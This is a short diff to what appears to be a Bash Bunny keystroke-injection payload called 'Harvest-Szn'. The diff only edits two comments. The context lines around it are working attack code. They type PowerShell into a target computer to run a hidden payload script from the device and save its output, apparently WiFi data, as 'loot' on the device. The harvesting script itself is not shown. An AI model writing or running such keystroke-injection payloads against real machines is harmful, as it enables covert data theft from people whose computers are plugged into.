@@ -52,14 +52,14 @@ QUACK STRING "\$bashBunnyDrive = (Get-WmiObject -Query \"SELECT * FROM Win32_Vol
 QUACK ENTER
 QUACK STRING "\$scriptPath = \"\$bashBunnyDrive\\payloads\\$SWITCH_POSITION\\\payload.ps1\""
 QUACK ENTER
-# Fixed: Use PowerShell to generate timestamp and properly escape quotes
+# Use PowerShell to generate timestamp and properly escape quotes
 QUACK STRING "\$timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'"
 QUACK ENTER
 QUACK STRING "\$lootPath = \"\$bashBunnyDrive\\loot\\Harvest-Szn\\loot_\$timestamp.txt\""
 QUACK ENTER
 QUACK STRING "& \$scriptPath | Out-File \$lootPath"
 QUACK ENTER
-sleep 30  # Increased from 10 to 30 seconds for WiFi scanning
+sleep 30  # 30 seconds for WiFi scanning
 QUACK STRING exit
 QUACK ENTER
 
